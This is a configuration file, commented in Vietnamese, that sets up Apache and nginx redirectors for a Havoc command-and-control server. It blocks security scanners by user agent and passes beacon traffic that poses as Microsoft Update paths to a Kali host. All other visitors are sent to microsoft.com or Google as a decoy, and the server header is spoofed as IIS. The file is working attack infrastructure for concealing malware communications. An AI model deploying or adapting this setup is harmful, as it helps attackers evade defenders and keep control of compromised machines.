# ----------------------------------------------------------------------
# HAVOC C2 REDIRECTOR CONFIGURATION
# ----------------------------------------------------------------------

RewriteEngine On

# [PHẦN 1] - CHẶN CÁC MÁY QUÉT VÀ SOC (BLOCKING)
# Chặn các User-Agent phổ biến của các công cụ scan (Nmap, Nikto, Nessus...)
RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap).* [NC]
RewriteRule ^.*$ - [F,L]

# [PHẦN 2] - ĐIỀU KIỆN NHẬN DIỆN BEACON (VALIDATION)
# Điều kiện 1: User-Agent phải khớp chính xác với Profile Havoc của bạn
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]

# Điều kiện 2: URI phải nằm trong danh sách trắng (Whitelist URIs)
# Ở đây tôi dùng regex để khớp với các đường dẫn Microsoft Update giả lập
RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [OR]
RewriteCond %{REQUEST_URI} ^/p/v1/win/updates/.*

# [PHẦN 3] - HÀNH ĐỘNG: ĐẨY VÀO VPN TUNNEL (PROXY)
# Nếu thỏa mãn các điều kiện trên, Apache sẽ đóng vai trò Proxy đẩy về Kali 2
# [P] = Proxy, [L] = Last Rule, [NE] = No Escape
RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L,NE]

# [PHẦN 4] - GIẢ DẠNG (DECOY/CLOAKING)
# Nếu KHÔNG thỏa mãn điều kiện (người lạ truy cập), chuyển hướng về trang uy tín
# Bạn có thể thay đổi link này thành website công ty thật để ngụy trang
RewriteRule ^.*$ https://www.microsoft.com [R=302,L]

# [PHẦN 5] - BẢO MẬT BỔ SUNG
# Xóa các Header tiết lộ thông tin của Apache/PHP
Header unset X-Powered-By
Header set Server "Microsoft-IIS/10.0"






ap $http_user_agent $is_havoc {
    default 0;
    "~*Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0" 1; 
}

server {
    listen 80; # Cổng nhận beacon
    server_name net.mytotobanservice.info;

    location / {
        # Nếu không đúng User-Agent -> Chuyển hướng sang Google (giả vờ là khách thường)
        if ($is_havoc = 0) {
            return 301 https://www.google.com;
        }

        # Nếu đúng User-Agent và đúng URI bí mật -> Đẩy về Kali 2
        location ~* ^/msdownload/update/v3/static/ {
            proxy_pass http://192.168.209.128:8080; # IP của Kali 2
            proxy_set_header Host $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
    }
}

